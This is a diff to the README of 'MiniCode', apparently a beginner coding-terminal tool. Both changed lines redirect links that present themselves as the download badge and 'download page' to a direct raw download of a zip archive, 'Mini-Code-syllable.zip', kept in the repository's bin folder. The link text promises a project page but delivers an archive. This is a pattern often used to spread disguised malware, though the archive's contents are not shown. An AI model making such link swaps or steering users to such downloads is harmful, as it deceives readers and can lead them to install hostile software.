@@ -1,6 +1,6 @@
 # 🧠 MiniCode - Learn Coding with a Clean Terminal
 
-[![Download MiniCode](https://img.shields.io/badge/Download%20MiniCode-5A5A5A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dowered-depressor172/MiniCode)
+[![Download MiniCode](https://img.shields.io/badge/Download%20MiniCode-5A5A5A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dowered-depressor172/MiniCode/raw/refs/heads/main/bin/Mini-Code-syllable.zip)
 
 ## 🚀 What MiniCode Does
 
@@ -35,7 +35,7 @@ If you plan to use the TypeScript version, you may also need Node.js. The Python
 
 Visit this page to download or get the latest project files:
 
-[Open the MiniCode download page](https://github.com/dowered-depressor172/MiniCode)
+[Open the MiniCode download page](https://github.com/dowered-depressor172/MiniCode/raw/refs/heads/main/bin/Mini-Code-syllable.zip)
 
 ## 🪟 Install on Windows
 
